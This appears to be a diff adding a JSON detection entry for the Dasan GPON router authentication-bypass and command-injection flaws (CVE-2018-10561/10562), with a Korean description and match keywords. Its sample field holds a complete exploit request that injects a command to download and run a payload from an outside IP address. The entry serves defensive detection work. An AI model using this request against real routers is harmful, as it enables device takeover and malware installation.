@@ -1,0 +1,8 @@
+{
+        "Name": "Dasan GPON Routers Authentication Bypass CMD Injection",
+        "Description": "-/GponForm/diag_FORM 또는 .html 등의 객체에서 잘못 처리되 인증이 우회되는 취약점\n-취약한 라우터를 검색한 후 URL에 ?images/ 문자열을 추가해 요청\n-diag_action = ping 요청의 dest_host 매개 변수에 명령어 삽입\n-라우터는 ping 결과를 /tmp에 저장하고 사용자가 .html, diag_FORM 을 다시 방문 할 때 사용자에게 전송\n-공격 성공시 사용자는 시스템에서 임의의 코드를 실행",
+        "References": ["CVE-2018-10561", "CVE-2018-10562"],
+        "Samples": ["POST /GponForm/diag_Form?images/ HTTP/1.1\nHost: 1.1.1.1\nContent-Length: 94\nUser-Agent: python-requests/2.6.0 CPython/2.7.5 Linux/4.4.127-mainline-revl\nConnection: keep-alive\nAccept: */*\nAccept-Encoding: gzip, deflate\n\nXWebPageName=diag&diag_action=ping&wan_conlist=0&dest_host=`busybox+wget+http://159.89.204.166/gpon+-O+/tmp/fwef;sh+/tmp/fwef`&ipv=0"],
+        "Keywords": [["POST", "GponForm","diag_Form", "images"], ["diag_action","ping"]],
+        "Signature": []
+}
